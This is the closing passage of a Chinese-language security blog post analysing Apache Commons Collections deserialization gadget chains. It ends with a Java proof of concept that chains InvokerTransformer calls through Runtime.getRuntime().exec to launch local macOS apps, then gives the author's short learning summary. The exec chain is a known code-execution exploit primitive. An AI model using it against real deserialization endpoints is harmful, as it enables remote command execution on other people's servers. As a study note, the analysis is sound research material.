class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)}),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calendar.app/Contents/MacOS/Calendar&quot;</span>)})});</span><br><span class="line">        chainDemo.transform(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211174913454.png" alt></p>
<p><strong>&#x5C0F;&#x7ED3;</strong></p>
<p>&#x901A;&#x8FC7;&#x5BF9; Commons Collections &#x5404;&#x4E2A;&#x94FE;&#x6761;&#x7684;&#x68B3;&#x7406;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x5BF9; Java &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8BA4;&#x8BC6;&#x8D8A;&#x53D1;&#x6DF1;&#x523B;</p>
<p>&#x6CA1;&#x6709;&#x627E;&#x5230;&#x65B0;&#x7684; gadgets &#xFF0C;&#x53CD;&#x5012;&#x5207;&#x6362; Java &#x7248;&#x672C;&#x8D8A;&#x53D1;&#x5A34;&#x719F;<img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211180848445.png" alt="image-20210211180848445"></p>
<p><strong>&#x672C;&#x7BC7;&#x4F5C;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;&#xFF0C;&#x53C2;&#x8003;&#x4E86;&#x8BF8;&#x591A;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x5199;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x4E0D;&#x662F;&#x4E00;&#x6C14;&#x5475;&#x6210;&#xFF0C;&#x5982;&#x6587;&#x4E2D;&#x6709;&#x9519;&#x8BEF;&#x8BF7;&#x4E0D;&#x541D;&#x8D50;&#x6559;</strong></p>
</body></html>
    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Java/">#Java</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">深入 Java 原生反序列化 &amp; JDK7u21 利用链分析</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/">甲方安全建设的思路学习和思考</a>
            
        </span>
    </div>
    
</article>




    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2021 P2hm1n&nbsp;
                 
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("zh-CN");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Seiten',
                CATEGORIES: 'Kategorien',
                TAGS: 'Tags',
                UNTITLED: '(제목없음)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>